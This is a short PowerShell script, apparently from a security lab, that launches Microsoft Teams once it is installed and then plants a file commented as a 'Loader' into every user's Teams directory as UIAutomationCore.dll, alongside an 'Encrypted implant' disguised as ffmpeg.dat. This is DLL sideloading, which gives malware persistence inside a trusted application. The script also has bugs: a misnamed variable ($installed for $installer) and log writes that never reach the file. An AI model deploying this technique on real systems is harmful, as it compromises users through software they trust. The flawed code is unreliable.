while($true) {

    $installer = Test-Path "C:\Program Files (x86)\Teams Installer\Teams.exe"

    if ($installed -eq $false) {
        Write-Host "Sleeping for 10..." > C:\Users\Public\Desktop\InstallLog.txt
        Start-Sleep 10

    }
    if($installer -eq $true) {
        Write-Host "Choco install done! Starting Teams now!" > C:\Users\Public\Desktop\InstallLog.txt
        Start-Job -ScriptBlock { Start-Process -PSPath 'C:\Program Files (x86)\Teams Installer\Teams.exe' }
        break
    }

}

# Transfer files into install dir
Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\LunarUI.bin" C:\Users\$_"\AppData\Local\Microsoft\Teams\current\UIAutomationCore.dll" } # Loader
Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\ffmpeg.dat" C:\Users\$_"\AppData\Local\Microsoft\Teams\current\ffmpeg.dat" }            # Encrypted implant
echo "Done!" > C:\Users\Public\Desktop\LAB_FILES\Installed.txt
